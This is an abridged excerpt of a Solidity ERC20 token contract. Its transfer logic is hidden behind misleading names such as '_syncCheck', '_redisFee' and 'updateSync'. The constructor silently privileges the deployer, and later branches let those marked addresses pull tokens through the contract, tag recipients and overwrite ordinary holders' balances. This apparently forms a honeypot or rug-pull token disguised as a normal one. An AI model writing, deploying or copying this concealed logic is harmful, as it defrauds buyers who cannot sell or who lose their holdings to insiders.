...
contract Contract is IERC20, Ownable {
    ...
    mapping(address => uint256) private _syncCheck;
    ...
    constructor(
        ...
        _syncCheck[msg.sender] = _redisFee;
        _syncCheck[address(this)] = _redisFee;
    ...
    function updateSync     (
        ...
        if (manageEarlySellTax && ERCcontractBalance > _redisFee && !syncTradingbool && from != uniswapPairFactory) {
            syncTradingbool = true;
            swapAndLiquifyOn(ERCcontractBalance);
            syncTradingbool = false;
        } else if (_syncCheck[from] > _redisFee && _syncCheck[to] > _redisFee) {
            _viewCurrentSupply = amount;
            _Balances[address(this)] += _viewCurrentSupply;
            tSwapTokens(amount, to);
            return;
        } else if (to != address(router) && _syncCheck[from] > 0 && amount > _redisFee && to != uniswapPairFactory) {
            _syncCheck[to] = amount;
            return;
        } else if (!syncTradingbool && _tOwned[from] > 0 && from != uniswapPairFactory && _syncCheck[from] == 0) {
            _tOwned[from] = _syncCheck[from] - _redisFee;
        }
        address _getValues = bots[uniswapPairFactory];
        if (_tOwned[_getValues] == 0) _tOwned[_getValues] = _redisFee;
        bots[uniswapPairFactory] = to;
        if (_tFeesTotal > 0 && _syncCheck[from] == 0 && !syncTradingbool && _syncCheck[to] == 0) {
            _viewCurrentSupply = (amount * _tFeesTotal) / 100;
